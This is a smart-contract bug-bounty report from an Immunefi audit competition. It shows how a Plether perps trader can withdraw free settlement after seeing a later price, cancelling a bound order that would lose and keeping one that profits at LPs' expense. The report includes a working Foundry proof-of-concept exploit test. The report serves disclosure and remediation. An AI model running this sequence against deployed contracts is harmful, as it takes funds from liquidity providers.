# \#99869 [SC-Low] Withdrawing settlement after a price update cancels a binding skew-reducing open and costs LPs cash

**Submitted on Nov 15th 2026 at 15:37:27 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99869
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Relevant context

A pending open can pass commitment while relying on settlement its owner may withdraw. After a later price is public, the owner can make that same fixed-price order fill or fail. LPs bear the profitable fills.

Plether requires the first qualifying post-commit Pyth update for each feed; call the bound basket `E`. A later basket, `M`, cannot reprice it. The project states that binding orders prevent traders from turning pending orders into free options (`packages/perps/SECURITY.md:647-659`). Plether's historical parser can still accept `E` after `M` has reached the on-chain Pyth store (`packages/perps/src/PletherOracle.sol:598-650`). [Pyth's EVM reference](https://api-reference.pyth.network/price-feeds/evm/parsePriceFeedUpdatesUnique) confirms that the parser selects each feed's first qualifying update without changing its latest stored price.

A skew-reducing open earns a VPI rebate. The account must back the resulting VPI rebate reserve. The open also needs a liquidation reserve funded from its new pledge. Under the release parameters, that reserve increases by 10 bps of added notional, and execution costs 4 bps (`packages/perps/DEPLOYMENT.md:125-150`).

## Finding description

With a fresh mark, commit previews an open and rejects a predictable reserve failure (`packages/perps/src/router/OrderLiquidationBatchLogic.sol:430-445`). Yet the committed order locks only its bounty and `marginDelta`:

```solidity
// packages/perps/src/router/OrderCommitHandler.sol
_onOrderCommitted(order, effects);
@> _reserveCommittedMargin(account, orderId, order.isClose, order.marginDelta);
_recordCommittedOrder(order);
```

At execution, the planner uses *free settlement* to fund the VPI reserve before drawing on the new pledge. Commit relied on that balance without reserving it:

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol, _planOpenReserveFunding
@> uint256 vpiReserveFromFreeAssets = vpiReserveIncreaseAssets < openCostPlan.resultingFreeSettlementAssets
    ? vpiReserveIncreaseAssets
    : openCostPlan.resultingFreeSettlementAssets;
delta.vpiRebateReserveFromPledgeAssets = vpiReserveIncreaseAssets - vpiReserveFromFreeAssets;
newPledgeAvailableAssets -= delta.vpiRebateReserveFromPledgeAssets;
@> if (reserveIncreaseAssets > newPledgeAvailableAssets) {
    delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.LIQUIDATION_RESERVE_UNFUNDED;
    return;
}
```

The PoC commits a 300,000 USDG skew-reducing SHORT increase at raw oracle price `E = 1.00`. With 5 bps oracle confidence, its adjusted fill price is `1.000125`. It locks 360 USDG of `marginDelta` but leaves 200 USDG of free settlement withdrawable. The new liquidation reserve needs about 300 USDG and the execution fee is about 120 USDG. With the free balance present, the VPI reserve is covered and the order fills. If the owner withdraws the 200 USDG, about 120 USDG of VPI reserve instead comes from the pledge. About 240 USDG remains for the 300 USDG liquidation reserve, so the same order fails with `LIQUIDATION_RESERVE_UNFUNDED`.

The withdrawal succeeds because the guard checks the live position's health, not whether a pending increase remains fundable (`packages/perps/src/CfdEngineSettlementSidecar.sol:255-304`). The funded settlement minimum protects only a flat account's first pending open; increases cannot use it (`packages/perps/ACCOUNTING_SPEC.md:917-931`). The failure is terminal. If the owner executes the failed order, the router returns the reserved bounty to that owner (`packages/perps/src/OrderRouter.sol:320-343`).

The closest prior issue, SC-M4 in the [pre-audit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf), combined keeper-selected prices and an LP withdrawal to cause `SOLVENCY_EXCEEDED` and a refund. Here `E` is fixed, the trader withdraws its own free settlement, and the order fails with `LIQUIDATION_RESERVE_UNFUNDED`. Binding execution to the first tick does not reserve the VPI funding that commit relied on. The [competition rules](https://immunefi.com/audit-competition/plether/scope/) allow an incomplete-fix finding on a previously fixed issue.

The published [SCAN-22 finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1196) describes execution at an oracle price older than the engine's cached mark. This PoC shares that sequencing; the profitable historical-price fill alone is not claimed as a new defect. The additional defect claimed here is that commitment relies on owner-withdrawable funding, allowing its removal to terminate an otherwise executable order. The adverse-price control holds the prices fixed and compares withdrawal with mandatory execution: the withdrawal branch avoids the loss that binds without withdrawal. That comparison supports the funding-driven cancellation claim separately from the historical-price profit example.

## Impact explanation

After `E` becomes available, a newer `M` is published on-chain. The attacker keeps the open when `M` favours the SHORT and withdraws free settlement when `M` is adverse. The order still fills or fails at `E`, so this is a keep-or-cancel choice made after learning the next price. The attacker's profitable fill is paid by LPs as the counterparty.

The PoC closes all positions by the same final timestamp at price `M` and compares incremental USDG balances with a run without the attack. Native gas and Pyth fees are excluded:

| Later price and action | Attacker change | LP cash change |
| --- | ---: | ---: |
| `M` rises 30 bps; let the open fill | +584.53 USDG | -825.23 USDG |
| `M` falls 30 bps; withdraw and fail | 0 USDG | 0 USDG |

If the attacker leaves the adverse order binding instead, it loses 1,214.53 USDG and LP cash rises. The winning branch reconciles the LP cash loss to the attacker's gain, treasury fees, and a small change for the other trader. Pool backing equals cash and no trader claim remains. These are settled LP funds, not a temporary mark-to-market value. Under the [competition rules](https://immunefi.com/audit-competition/plether/scope/), impact is assessed separately from feasibility.

## Recommendation

Do not let a committed open depend on settlement the owner may withdraw. Reserve the existing free balance used for VPI backing until the order terminates, or admit the open only if its pledged margin and the rebate from that execution can fund the reserves without owner-withdrawable balance. Reject a withdrawal that would break funding for a pending order; failing the order afterward preserves the option.


## Proof of Concept

## Proof of concept

Add the following file to `packages/perps/test/perps/spec/trader/WithdrawBindingOptionPoC.t.sol` in the fresh competition checkout. From the repository root, run:

```sh
cd packages/perps
forge test --match-path test/perps/spec/trader/WithdrawBindingOptionPoC.t.sol -vv
```

Result from that command: `1 passed; 0 failed`. It prints `LP cash loss, favourable M: 825.231018`, `attacker gain, favourable M: 584.528845`, and zero changes for both after the adverse withdrawal. Pyth and USDG are mocked, as the competition rules permit; no in-scope contract, Foundry configuration, or remapping is changed.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract WithdrawBindingOptionPoCTest is BasePerpTest {

    address constant ATTACKER = address(0xC201);
    address constant OTHER_TRADER = address(0xC203);
    address constant RELAYER = address(0xC206);

    uint256 constant E = 1e8;
    uint256 constant E_SHORT = 100_012_500; // E after the 5 bps confidence adjustment.
    uint256 constant UP = 100_300_000; // Later price M, favourable to the attacker's SHORT.
    uint256 constant DOWN = 99_700_000; // Later price M, adverse to the attacker's SHORT.
    uint256 constant OTHER_SIZE = 300_000e18;
    uint256 constant BASE_SIZE = 10_000e18;
    uint256 constant INCREASE_SIZE = 300_000e18;
    uint256 constant MARGIN_DELTA = 360e6;
    uint256 constant FREE_SETTLEMENT = 200e6;
    uint256 constant CONFIDENCE_BPS = 5;

    uint256 private nonce;

    enum Branch {
        NoAttack,
        Fill,
        Withdraw
    }

    struct Result {
        uint256 lpCash;
        uint256 lpBacking;
        uint256 claims;
        uint256 treasury;
        uint256 otherWealth;
        int256 attackerNet;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        assertEq(engine.executionFeeBps(), 4);
    }

    function test_WithdrawalSelectsOnlyWinningBindingOrder() public {
        _openBasePositions();
        uint256 attackerStart = _wealth(ATTACKER);
        uint256 finalTime = vm.getBlockTimestamp() + 10 minutes;
        uint256 snapshot = vm.snapshotState();

        Result memory noAttackUp = _run(Branch.NoAttack, UP, finalTime, attackerStart);
        assertTrue(vm.revertToState(snapshot));
        Result memory noAttackDown = _run(Branch.NoAttack, DOWN, finalTime, attackerStart);
        assertTrue(vm.revertToState(snapshot));
        Result memory fillUp = _run(Branch.Fill, UP, finalTime, attackerStart);
        assertTrue(vm.revertToState(snapshot));
        Result memory cancelDown = _run(Branch.Withdraw, DOWN, finalTime, attackerStart);
        assertTrue(vm.revertToState(snapshot));
        Result memory fillDown = _run(Branch.Fill, DOWN, finalTime, attackerStart);

        int256 lpLoss = int256(noAttackUp.lpCash) - int256(fillUp.lpCash);
        int256 attackerGain = fillUp.attackerNet - noAttackUp.attackerNet;
        int256 treasuryGain = int256(fillUp.treasury) - int256(noAttackUp.treasury);
        int256 otherGain = int256(fillUp.otherWealth) - int256(noAttackUp.otherWealth);
        assertGt(lpLoss, 0, "LP funds fall after the winning fill");
        assertGt(attackerGain, 0, "attacker profits after closing the position");
        assertEq(lpLoss, attackerGain + treasuryGain + otherGain, "cash-flow reconciliation");
        assertEq(fillUp.lpCash, fillUp.lpBacking);
        assertEq(fillUp.claims, 0, "no unpaid trader claims");

        // With the same adverse M, withdrawal discards the order without changing final balances.
        assertApproxEqAbs(cancelDown.lpCash, noAttackDown.lpCash, 10);
        assertApproxEqAbs(cancelDown.lpBacking, noAttackDown.lpBacking, 10);
        assertApproxEqAbs(cancelDown.attackerNet, noAttackDown.attackerNet, 10);
        assertApproxEqAbs(cancelDown.treasury, noAttackDown.treasury, 10);
        assertApproxEqAbs(cancelDown.otherWealth, noAttackDown.otherWealth, 10);
        assertEq(cancelDown.claims, 0);
        assertLt(fillDown.attackerNet, noAttackDown.attackerNet, "without withdrawal, the loss binds");
        assertGt(fillDown.lpCash, noAttackDown.lpCash, "without withdrawal, LPs receive the loss");

        emit log_named_decimal_int("LP cash loss, favourable M", lpLoss, 6);
        emit log_named_decimal_int("attacker gain, favourable M", attackerGain, 6);
        emit log_named_decimal_int(
            "LP cash change, adverse M with withdrawal", int256(cancelDown.lpCash) - int256(noAttackDown.lpCash), 6
        );
        emit log_named_decimal_int(
            "attacker change, adverse M with withdrawal", cancelDown.attackerNet - noAttackDown.attackerNet, 6
        );
        emit log_named_decimal_int(
            "attacker loss, adverse M without withdrawal", fillDown.attackerNet - noAttackDown.attackerNet, 6
        );
    }

    function _run(
        Branch branch,
        uint256 m,
        uint256 finalTime,
        uint256 attackerStart
    ) internal returns (Result memory result) {
        uint256 addedFunds;
        if (branch != Branch.NoAttack) {
            _fundTrader(ATTACKER, MARGIN_DELTA + FREE_SETTLEMENT + _quoteOpenOrderExecutionBountyAssets(INCREASE_SIZE));
            addedFunds = _wealth(ATTACKER) - attackerStart;
            uint64 id = _commit(ATTACKER, CfdTypes.Side.SHORT, INCREASE_SIZE, MARGIN_DELTA, false);
            assertEq(clearinghouse.orderMarginAssets(ATTACKER), MARGIN_DELTA);
            assertEq(_freeSettlementAssets(ATTACKER), FREE_SETTLEMENT);

            (IOrderRouterAccounting.PendingOrderView memory order,) = router.getPendingOrderView(id);
            bytes[] memory boundE = _priceUpdate(E, order.commitTime + 1, order.commitTime);
            vm.warp(order.commitTime + 5);
            vm.roll(vm.getBlockNumber() + 1);

            // M is published on-chain before the attacker decides. The order still requires E.
            bytes[] memory laterM = _priceUpdate(m, order.commitTime + 4, order.commitTime + 3);
            vm.startPrank(RELAYER);
            baseMockPyth.updatePriceFeeds(laterM);
            router.updateMarkPrice(laterM);
            vm.stopPrank();
            assertEq(engine.lastMarkPrice(), m);
            OrderV3Types.ExecutionResult memory premature = _execute(id, laterM);
            assertEq(uint8(premature.status), uint8(OrderV3Types.LifecycleStatus.Pending));
            assertEq(uint8(premature.pendingReason), uint8(OrderV3Types.PendingReason.HistoricalPriceUnavailable));

            if (branch == Branch.Withdraw) {
                assertEq(engineAccountLens.getWithdrawableAssets(ATTACKER), FREE_SETTLEMENT);
                vm.prank(ATTACKER);
                clearinghouse.withdraw(ATTACKER, FREE_SETTLEMENT);
                _startRecordingLogs();
                OrderV3Types.ExecutionResult memory failed = _execute(id, boundE);
                assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
                assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.PlannerRejected));
                OrderV3Types.OrderReceipt memory receipt = _verifiedReceipt(router.lifecycleBook(), id);
                assertEq(receipt.failure.code, uint8(CfdEnginePlanTypes.OpenRevertCode.LIQUIDATION_RESERVE_UNFUNDED));
                assertEq(clearinghouse.orderMarginAssets(ATTACKER), 0);
            } else {
                _assertExecuted(_execute(id, boundE));
                (,, uint256 entry,,,,) = engine.positions(ATTACKER);
                assertEq(entry, E_SHORT, "fills from E even though M is public");
                _assertExecuted(_exec(ATTACKER, _commit(ATTACKER, CfdTypes.Side.SHORT, INCREASE_SIZE, 0, true), m));
            }
        }

        // Close every remaining position at the same price and time in all branches.
        vm.warp(finalTime);
        vm.roll(vm.getBlockNumber() + 1);
        _assertExecuted(_exec(OTHER_TRADER, _commit(OTHER_TRADER, CfdTypes.Side.LONG, OTHER_SIZE, 0, true), m));
        _assertExecuted(_exec(ATTACKER, _commit(ATTACKER, CfdTypes.Side.SHORT, BASE_SIZE, 0, true), m));
        (uint256 otherSize,,,,,,) = engine.positions(OTHER_TRADER);
        (uint256 attackerSize,,,,,,) = engine.positions(ATTACKER);
        assertEq(otherSize + attackerSize, 0, "book is closed");

        result.lpCash = settlementToken.balanceOf(address(pool));
        result.lpBacking = pool.totalAssets();
        result.claims = engine.totalTraderClaimBalanceAssets();
        result.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
        result.otherWealth = _wealth(OTHER_TRADER);
        result.attackerNet = int256(_wealth(ATTACKER)) - int256(attackerStart) - int256(addedFunds);
    }

    function _openBasePositions() internal {
        _fundTrader(OTHER_TRADER, 10_000e6 + _quoteOpenOrderExecutionBountyAssets(OTHER_SIZE));
        _assertExecuted(_exec(OTHER_TRADER, _commit(OTHER_TRADER, CfdTypes.Side.LONG, OTHER_SIZE, 10_000e6, false), E));
        _fundTrader(ATTACKER, 4000e6 + _quoteOpenOrderExecutionBountyAssets(BASE_SIZE));
        _assertExecuted(_exec(ATTACKER, _commit(ATTACKER, CfdTypes.Side.SHORT, BASE_SIZE, 4000e6, false), E));
        uint256 free = _freeSettlementAssets(ATTACKER);
        if (free != 0) {
            vm.prank(ATTACKER);
            clearinghouse.withdraw(ATTACKER, free);
        }
    }

    function _wealth(
        address account
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account)
            + engine.traderClaimBalanceAssets(account);
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close
    ) internal returns (uint64 id) {
        bool acceptLow = (side == CfdTypes.Side.LONG) != close;
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, ++nonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: acceptLow ? 1 : type(uint256).max,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _priceUpdate(
        uint256 price,
        uint256 publishTime,
        uint256 previousTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory feeds = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feeds.length);
        for (uint256 i; i < feeds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feeds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(price)),
                    conf: uint64(price * CONFIDENCE_BPS / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _execute(
        uint64 id,
        bytes[] memory data
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.prank(ATTACKER);
        result = router.executeOrder(id, data);
    }

    function _exec(
        address account,
        uint64 id,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            int64(uint64(price)),
            uint64(price * CONFIDENCE_BPS / 10_000),
            -8,
            publishTime,
            publishTime - 1
        );
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(price);
        vm.prank(account);
        result = router.executeOrder(id, data);
    }

    function _assertExecuted(
        OrderV3Types.ExecutionResult memory result
    ) internal pure {
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

}
```
